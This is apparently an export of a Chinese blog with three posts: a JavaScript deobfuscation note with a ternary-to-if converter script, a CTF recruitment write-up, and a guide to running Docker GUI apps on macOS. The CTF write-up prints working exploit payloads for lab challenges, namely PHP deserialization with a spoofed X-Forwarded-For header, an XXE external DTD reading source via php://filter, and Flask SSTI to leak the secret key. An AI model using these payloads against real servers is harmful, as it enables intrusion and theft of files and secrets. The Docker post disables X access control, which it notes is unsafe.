转换工具(需要用空格分隔关键字) website-dev.eu 的转换工具(需要科学上网，或手动换源) 然而如上所述，三位前辈的工具都有着各自的问题，先抛开 IIFE 的可读性不说，后面两只并没有支持诸如 1?(2?3:4,3?4:5):6 这样的平行语句，因此并不能处理上面的表达式，考虑到未来可能还会有类似的需求，故以解决上述情况为主要目标，掏出 Python 一顿乱敲产出了如下脚本（TL;DR）： 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556575859606162636465666768697071727374# 引号中输入想要处理的内容tmp = \"\"# 预处理 删除所有空格 方便后面判断左右是否有括号tmp = tmp.replace(' ', '')# 将一组语句在考虑括号的前提下以逗号再分组def getSplitContent(tmp): balance = 0 indexs = [] words = [] for i in range(len(tmp)): if tmp[i] == '(': balance += 1 elif tmp[i] == ')': balance -= 1 elif tmp[i]==',' and balance==0: indexs.append(i) # 手动切分 因为 str 是不可变对象 暂时没有好办法 i = -1 for j in indexs: words.append(tmp[i+1:j]) i = j else: words.append(tmp[i+1:]) return words# 获得 tmp 中和 ? 匹配的 : 符号def getIndex(tmp): balance = 0 for i in range(len(tmp)): if tmp[i] == '?': balance += 1 elif tmp[i] == ':': balance -= 1 if balance == 0: return i else: return -1def fun(input, n=0): if input.startswith('(') and input.endswith(')'): input = input[1:-1] tab = ' '*n splitTmp = getSplitContent(input) for tmp in splitTmp: # 没找到则说明当前语句不可再分 left = tmp.find('?') if left == -1: print(\"%s%s;\"%(tab, tmp)) continue # 没找到则说明条件表达式不完整 right = getIndex(tmp) if right == -1: print(\"Error\") exit() # 打印当前层的 if-else 语句并递归处理子句 print(\"%sif (%s) &#123;\"%(tab, tmp[:left])) fun(tmp[left+1:right], n+1) print('%s&#125; else &#123;'%tab) fun(tmp[right+1:], n+1) print('%s&#125;'%tab)fun(tmp) 主要思路比较简单，就是以括号为基准挑选出可作为分隔符的逗号，并以此对语句进行分组后再递归处理，唯一比较坑的地方是 python 中 str 属于不可变对象，因此这里只好采用记录下标并手动拆分的办法= = 同时，受上面前辈的启发，觉得可以在博客里开个 杂项 的板块，里面放一些小脚本等与博客本身没什么关系的东西，这样既方便日后的使用，也可以作为一种练习，嗯，可喜可贺。 把上面的一坨表达式丢进脚本里，再用运行后的结果替换之，可以发现这个名为 g 的函数就是逻辑的主要部分了。 0x11 setTimeout 以及 js 事件循环机制结束替换的工作后，就可以开始读代码了。考虑到实际的效果，能够猜到代码里包含着类似循环的部分，可是尝试搜索 for 和 while 时都没有找到任何内容。在仔细阅读后，终于发现在上面转换出来的 g 函数里静静地躺着一只 setTimeout(g, n) ，想来它就是我们的目标了。 可是很奇怪，之前在 w某school 和 某鸟 中了解到该函数只是设置一个表达式在多少毫秒后执行（因为没有实际用过我一直以为是像 sleep 一样的东西），那么如果把它放在这个地方，为什么不会因为无限递归而爆栈呢？ 继续 STFW 后，终于得到答案，这里为了方便日后回忆以及防止链接挂掉，简单地总结一下： 首先要明确的，是 js 本身是一个 单线程 的语言，但是为了更好地处理网页中日渐庞大的静态资源，其提供了 同步任务 和 异步任务 两种机制。在实际执行时，同步任务进入主线程，而异步任务进入 EventTable 并注册回调函数，在指定的事情完成后，EventTable 会将这个函数移入 EventQueue；当 js 的 monitoring process 进程发现主线程空栈后就会去 EventQueue 中读取对应的函数并执行，这个过程一直持续到所有的任务被完成。 而除了广义的 同步 与 异步，在精细定义下任务还可以被分成 宏任务(macro-task) 和 微任务(micro-task) ，前者包括整体代码，setTimeout，setInterval，后者包括 Promise，process.nextTick 等等；不同的任务在执行时会以这两种任务为基准进入对应的 EventQueue ，并交替运行直至所有任务被完成。 而 setTimeout 函数中用来表示时间的参数，实际上指的是经过多少毫秒后将任务从 EventTable 转移到宏任务的 EventQueue 中，所以影响实际时间的因素其实还挺多的，完全不是 w某school 和 某鸟 中说的那样= = 据说这一点在前端的面试题中屡见不鲜，以后有时间可以找一找相关的内容。 回到正题，由于这里把函数调用放到了所有语句的最后，所以时间上基本没什么偏差；而之所以以这种方式实现，是因为 js 本事是单线程的语言，所以如果这里以普通循环来实现的话会让其他的任务卡住，看来 这里异步的递归就是循环 呀，嗯，学到了。 0x12 createDocumentFragment 的含义从最终效果来看，这是一个不断更新文档元素的过程，通过查看代码可以发现，实际负责插入随机字符的是名为 m 的这个函数，注意到在其 for 循环中，有着名为 createDocumentFragment 的函数调用，这就又触及到我的盲区了，遂继续求助网络，得知该函数可以很好地工作在频繁更新元素的环境下。 0x2 结语做好上述准备后，就可以安心地读代码了。其本身并没有什么难度，在去掉了用来混淆的无关代码以及对变量和函数进行语义化后就得到了当前页面中使用的 js 代码了。有兴趣的朋友们可以看一下～ // 作为 web 坑的新人，非常渴望找到一个可以交流技术或可以一起合作写项目的个人或 // 团体，如果您对此有兴趣的话，非常欢迎通过右侧的联系方式与我交流～ (()=>{ let div = document.querySelector('#yuren-content'); let sequences = [\"一二三四五，上山打老虎。\", \"老虎没打到，打到小松鼠。\"]; let colors = [\"rgb(110,64,170)\", \"rgb(150,61,179)\", \"rgb(191,60,175)\", \"rgb(228,65,157)\", \"rgb(254,75,131)\", \"rgb(255,94,99)\", \"rgb(255,120,71)\", \"rgb(251,150,51)\", \"rgb(226,183,47)\", \"rgb(198,214,60)\", \"rgb(175,240,91)\", \"rgb(127,246,88)\", \"rgb(82,246,103)\", \"rgb(48,239,130)\", \"rgb(29,223,163)\", \"rgb(26,199,194)\", \"rgb(35,171,216)\", \"rgb(54,140,225)\", \"rgb(76,110,219)\", \"rgb(96,84,200)\"]; function getOneColor() { return colors[Math.floor(Math.random()*colors.length)]; } function getSomeChar(r) { let n=document.createDocumentFragment(); for (let i=0; i","categories":[{"name":"前端","slug":"前端","permalink":"/categories/前端/"}],"tags":[]},{"title":"NEXCTF 招新赛 WirteUP","slug":"NEXCTF-WriteUp","date":"2019-11-20T13:41:13.000Z","updated":"2023-12-30T18:04:50.525Z","comments":true,"path":"2019/11/20/NEXCTF-WriteUp/","link":"","permalink":"/2019/11/20/NEXCTF-WriteUp/","excerpt":"","text":"0x0 前言本文是上个月学校 NEX 战队招新赛中部分题目的 WriteUP ，因为赛事从结果上来说还是很令人高兴的，所以一直都想单独写一篇博客来记录这些题目，但是因为学校的一堆事情+拖延症的问题，差不多过了1个月才着手做这件事… 0x1 相关环境12345Python v3.7.4requests v2.22.0Flask v1.1.1Binwalk v2.1.1dd 0x2 各WriteUP0x20 Web 签到12345678910111213141516171819202122&lt;?php highlight_file(__FILE__);class ttt &#123; public function __destruct() &#123; try &#123; echo file_get_contents(\"/flag\"); &#125; catch (Exception $e) &#123; &#125; &#125; &#125;if($_GET['get'] === '1')&#123; if($_POST['post'] === '1') &#123; if($_SERVER[\"HTTP_X_FORWARDED_FOR\"] === '127.0.0.1') &#123; unserialize($_POST['class']); &#125; &#125;&#125; 代码如上，分析知 ttt 类的析构函数会输出 flag 内容，而代码中存在 unserialize 函数，故可知该代码存在反序列化漏洞。下面来构造 ttt 类的序列化内容，代码如下： 123&lt;?php class ttt &#123;&#125; echo serialize(new ttt); 那么现在解决问题的关键就是构造满足三个 if 条件的请求，以使程序流程到达反序列化函数那里。get 和 post 都是常规的请求，这里可以了解一下 X-Forwarded-For ，然后可通过 Python3+Requests 构造如下请求来获取 flag： 1__import__('requests').post('http://&lt;ip&gt;:&lt;port&gt;/?get=1', data=&#123;'post':'1','class':'O:3:\"ttt\":0:&#123;&#125;'&#125;, headers=&#123;'X-Forwarded-For':'127.0.0.1'&#125;).content 0x21 Baby Flask源码 提取码: upiv 可以看到，路由 /admin 可以获取到 Flag ，该视图函数通过验证 session 中 admin 的值来返还不同的内容；而因为 Flask 是客户端session的模式，故这个值可以人为修改。 那么解题的目标就变成了通过寻找注入点来获取 secretkey ，查看代码知调用 render_template_string 函数时第一个参数传递了 template.replace，将 模版中的 $remembered_name 替换成了 session 中 name 的值，通过查看 index.html 可知该占位符出现在 Info 模块和 Author 输入框的 value 属性中，故可通过合理控制 Author 中的值来实现注入。 而在 app.py 中，通过定义 safe_input 函数针对 post 过来的输入进行了过滤，查看代码可知输入中不能出现 ()[]_ 这几种字符，所以可以通过全局变量 config 来获取secretkey。 拿到key以后，通过构造 session ，并使用浏览器自带的开发者工具将原来的值替换掉即可通过访问 /admin 拿到 Flag。 0x22 Baby xxe12345678910111213141516171819&lt;?php libxml_disable_entity_loader(false);$xmlfile = $_POST['name'];if (empty($xmlfile)) &#123; highlight_file(__FILE__);&#125; else if (stristr($xmlfile, \"xml\")) &#123; $xmlfile = str_ireplace(\"&lt;!entity\", \"nonono\", $xmlfile);&#125; else &#123; $xmlfile = '&lt;?xml version=\"1.0\"?&gt;&lt;!DOCTYPE root[ &lt;!ENTITY all \"'.$xmlfile.'\"&gt;]&gt;&lt;root&gt;&amp;all;&lt;/root&gt;';&#125;$dom = new DOMDocument();$dom-&gt;loadXML($xmlfile, LIBXML_NOENT|LIBXML_DTDLOAD);$creds = simplexml_import_dom($dom);echo ($creds);?&gt; 提示信息：Flag 在 ./flag.php 中 尝试直接访问 flag.php 发现内容为 flag{f4ke_fl4g} ，也就是假 Flag ；那么根据提示来分析，很有可能真正的 Flag 被写在 php 代码的注释中或是有 if 条件来限制，所以首要的目标是拿到 flag.php 的代码。 通过分析上面的代码，可以发现 else 中 xmlfile 被双引号扩住，所以不能通过写入 SYSTEM 关键字来达到 xxe 的效果，而 else if 中只要出现 xml 字样就会替换 entity 关键字，但没有进一步的过滤措施，故可以通过载入 dtd 的方式实现注入。 题目本身是放在服务器上的，故想要访问自定义的 dtd 文件需要具备公网 ip 的设备，这里的复现因为在本地，就不做相关处理了。假设文件名为 tmp.dtd ，内容如下： 1&lt;!ENTITY test SYSTEM &quot;php://filter/read=convert.base64-encode/resource=./flag.php&quot;&gt; 这里要注意的是，由于最后 php 解析的是 xml 内容，而 flag.php 代码中存在诸如 &lt;&gt; 的符号，会对解析造成干扰，故采用 php 伪协议将文件内容以 base64 进行编码。 然后通过 Python+Requests 发送如下 POST 请求 1__import__(\"requests\").post(\"http://&lt;ip&gt;:&lt;port&gt;/&lt;题目文件名&gt;\", data=&#123;\"name\":'&lt;?xml version=\"1.0\"?&gt;&lt;!DOCTYPE root SYSTEM \"tmp.dtd\"&gt;&lt;root&gt;&amp;test;&lt;/root&gt;'&#125;).content 将得到的 base64 内容解码即可得到 php 代码，经过相关处理得到 Flag。 0x23 ScriptBoy文件包 提取码: gxfa 题目描述：筛选出所有文件中前两个数字都是4位的一行，将选出的每一行的第20位组成一个字符串， flag就是这个字符串的32位小写MD5的值 分析文件结构后可以用如下脚本构造 Flag： 12345678910111213141516from hashlib import md5result = []for i in range(1, 101): filename = \"./\"+str(i)+\"/\"+str(i)+\".txt\" with open(filename) as f: content = f.readlines() for tmp in content: split_tmp = tmp.split('----') if len(split_tmp[0])==len(split_tmp[1])==4: result.append(tmp[19])print(md5(''.join(result).encode('utf8')).hexdigest()) 0x24 ljmisc图片 提取码: mnck ⬆️打开链接前请做好心理准备 拿到图片后，执行 binwalk 1000.png 即可发现从 0x8B3F4 处开始隐藏了一个压缩包，故可执行 dd if=1000.png of=test.zip skip=0x8b3f4 bs=1 来将它提取出来。据说这个包经过了伪加密，但是当时因为环境是 MacOS ，所以也没有经历解密的操作，这里也就先不记录相关内容了。 打开后出现一个新的压缩包和两张图片，新的压缩包是真的被加密过的，所以要从另外两张图片寻找解压密码的线索。 两张图片并不能看出什么分别，但是大小却差了很多，故可以猜测是盲水印。 使用bwm处理后可以获得解压密码为 glgjssy_qyhfbqz，输入后即可打开压缩包到达第三层。 解压后的文件是一个充满0和1的文件，当时看了好久都没什么头绪。但是在我万能的舍友的帮助下，猜测这可能是描述了一张二维码，故通过以下脚本将1的位置填充为黑，0的位置填充为白： 123456789101112131415161718192021from PIL import ImageMAX = 256pic = Image.new(\"RGB\",(MAX, MAX))str = ''with open('./bin.txt') as f: str = f.read()i=0for y in range (0,MAX): for x in range (0,MAX): if(str[i] == '1'): pic.putpixel([x,y],(0, 0, 0)) else: pic.putpixel([x,y],(255,255,255)) i = i+1pic.show()pic.save(\"flag.png\") 扫描二维码即可获取 Flag。 0x3 总结本文记录了本次招新赛中的部分题目，其他的题目因为难以复现而暂时无法记录。 技术上的话题就到此为止了，下面是一些题外话： 15Zug5Li65piv56ys5LiA5qyh5YGaIGN0Zu+8jOaJgOS7peinieW+l+aXoOiuuuWmguS9lemDveimgeWGmeS4gOS6m+S4nOilv++8jOWPr+iDveaYr+S9nOS4uuaWsOaWueWQkeeahOi1t+eCue+8jOS5n+WPr+iDveaYr+S4uuS6huaWueS+v+aXpeWQjueahOWbnuW/huOAggoK5pyA6L+R6YGH5Yiw5LqG5ZCE56eN5LqL5oOF77yM55Sx5q2k5Lmf5oOz5LqG5b6I5aSa44CC5bCx5Zyo5LiK5Liq5a2m5pyf77yM5oiR5Zug5Li65b2T5pe255y85YWJ5q+U6L6D55+t5rWF6ICM5ouS57ud5LqG5LiA5Liq5py65Lya77yM5rKh5oOz5Yiw6L+Z5a2m5pyf5Y205Zug5q2k6ZSZ6L+H5LqG5b6I5aSa5LqL5oOF44CC5a+55LqO6L+Z5Lu25LqL77yM6K+05LiN5ZCO5oKU5piv5LiN5Y+v6IO955qE77yM5L2G5oiR5Y+I5LiN5piv5LiA5Liq5Lya55So6L+H5Y675Y+N5aSN5oqY56Oo6Ieq5bex55qE5Lq677yM6YCJ6ZSZ5LqG5bCx5piv6YCJ6ZSZ5LqG77yM5Lmf5rKh5LuA5LmI5aW96K+055qE44CCCgrog73lpJ/ov5vlhaUgTkVYIOaYr+aIkeayoeacieaDs+WIsOeahO+8jOi/meS5n+iuuOaYr+WPpuS4gOS4quacuuS8muOAguS4jeeuoeaAjuS5iOivtO+8jOWug+S7juWPpuS4gOS4quWxgumdouiuqeaIkeeci+WIsOS6huW+iOWkmuS4nOilv++8jOi/meS+v+Wkn+S6huOAggoK6LCo5Lul5q2k5paH6K2m6YaS5pyq5p2l55qE6Ieq5bex44CC","categories":[{"name":"CTF","slug":"CTF","permalink":"/categories/CTF/"}],"tags":[]},{"title":"在 Docker for MacOS 中运行 GUI 程序","slug":"Run-GUI-in-Docker","date":"2019-10-14T15:04:14.000Z","updated":"2023-12-30T18:04:50.525Z","comments":true,"path":"2019/10/14/Run-GUI-in-Docker/","link":"","permalink":"/2019/10/14/Run-GUI-in-Docker/","excerpt":"内容包括：前言+环境+具体操作+原理","text":"内容包括：前言+环境+具体操作+原理 0x0 前言在初步接触了 Docker 后，突然萌生了一个“可不可以在其中跑GUI程序的念头”，遂急忙STFW&amp;&amp;RTFM，并在查阅了相关的一些文档后，成功在本地运行了容器内的GUI测试程序，下面记录一下相关的工作和原理。 0x1 相关环境12Docker version 18.09.2XQuartz 2.7.11（xorg-server 1.18.4) 以上软件均可通过 homebrew 进行安装 0x2 具体操作 XQuartz -&gt; 偏好设置 -&gt; 安全性 -&gt; 勾选“允许从网络客户端连接” -&gt; 退出程序； 终端键入 xhost +（注意两者之间的空格）重新启动 XQuartz； 使用诸如 nmap 类的工具查看 6000 端口是否被 X11 服务占用，如果已经被占用即可继续下一步操作，如果没有被占用的话…因为没遇到过所以我也不知道怎么办:-P； 在 run 或 exec 容器时加入-e DISPLAY=host.docker.internal:0参数，比如我这里通过对一个现有的，已经安装过 xarclock 时钟小程序的容器 toyOS 执行docker exec -ite DISPLAY=host.docker.internal:0 toyOS /usr/bin/xarclock，就会在我的本地出现一个小时钟的GUI程序； 0x3 相关原理在 Linux 系统及一些 Unix-like 系统中，有着 X Window System 的概念（下面简称为 X系统），用户的 GUI 程序作为 X Client 向本地或远程的 X Server 交互，以得到底层的支持来在运行 X Server 的设备上绘制出图像，而 XQuartz 则是一款面向 MacOS 系统的 X系统，（在我理解的层面上）也提供了如上的功能支持。 于是在这个原理的支撑下，如何让 Docker 运行 GUI 程序 这个问题就被转化成了 如何在宿主机运行 X Server 以及 如何让 Docker 中的 X Client 与宿主机的 X Server 实现交互，下面分别来解决这两个问题： 0x31 如何在宿主机运行 X Server在 X系统的定义中可以看到，本身该系统就可以支持以网络为基础的 C-S 模型（虽然关注点更倾向于服务方），XQuartz 作为它的一种实现当然也不例外。但是出于安全上的考虑，XQuartz 默认是不允许通过网络进行交互的。要关闭这个限制，有两个方面要实现，分别对应 具体操作 中的1，2两个操作，第一个操作就像字面上的意思一样，关闭了网络连接限制，第二个操作则是关闭了连接鉴定（access control），可以通过运行 man xhost 来查看其 Man Page 以获得更多的信息。需要注意的是，因为本次实验的操作都是在本地实现的，所以完全关闭了连接鉴定，这在涉及到远程操作时是非常不安全的。 执行了上述步骤且 6000 端口被监听（默认情况）时，我们就成功在宿主机上运行起了 X Server，接下来就要解决第三个问题了。 0x32 如何让 Docker 中的 X Client 与宿主机的 X Server 实现交互作为 X Client 的程序如果想与 X Server 进行交互，大致分为两种方式： 在命令后加 --display 参数并指明相关的位置 用户提前设置好环境变量 DISPLAY ，程序从该变量获得相关信息 这里我们采用第二种方式，故在启动容器时通过 -e 参数为其设置 DISPLAY 变量，现在的问题在于，如何解释变量的值 host.docker.internal:0 呢？ 对于该变量中，冒号前面的部分，Docker 官方文档中有如下解释： The host has a changing IP address (or none if you have no network access). From 18.03 onwards our recommendation is to connect to the special DNS name host.docker.internal, which resolves to the internal IP address used by the host. 也就是说，这个值本质上是获得了宿主机的内部IP，为了验证这一点，可以通过 ifconfig 命令来查看宿主机实际的IP，并将 DISPLAY 的值换成 your_ip:0 ，可以发现和前面一样可以运行。之所以本次实验采用了前者，是因为要获取实际IP，第一是过程很麻烦，第二是设备要处于联网的状态下，而在文档的描述中可以看到 (or none if you have no network access) 这句话，也就是说，这种参数设置在无网络的条件下也可以正常运行。 那么 DISPLAY 的值就可以被解释为 your_ip:0 了，关于这个格式，其实它的完整形式为 your_ip: display_number. screen_number ，在本实验中其实可以写为 host.docker.internal:0.0，display_number 和 screen_number 均从0开始计数，前者表示一个输入流的标号（输入流包括显示器，键盘，鼠标等），后者表示输入流中某个具体的显示屏，因为很少有人使用多屏幕，所以 screen_number 多数情况下均为0，也就可以省略掉了。 而对于 display_number，X11 protocol 官方文档中有如下描述： For TCP connections, displays on a given host are numbered starting from 0, and the server for display N listens and accepts connections on port 6000 + N. 也就是说，这个值实际上取决于宿主机上 X11 服务占用的端口，用端口号减掉6000即可，这就是上述命令中冒号后面的0的具体含义。为了验证这一点，可以使用 socat 工具运行 socat tcp-listen:6100,reuseaddr,fork tcp:localhost:6000 命令，将6100端口的消息转交给6000端口，这样按照上面的描述，DISPLAY 变量的值就可以为 host.docker.internal:100 ，替换后执行完整命令，可以发现一样能运行GUI测试程序。","categories":[{"name":"Docker","slug":"Docker","permalink":"/categories/Docker/"}],"tags":[]}]}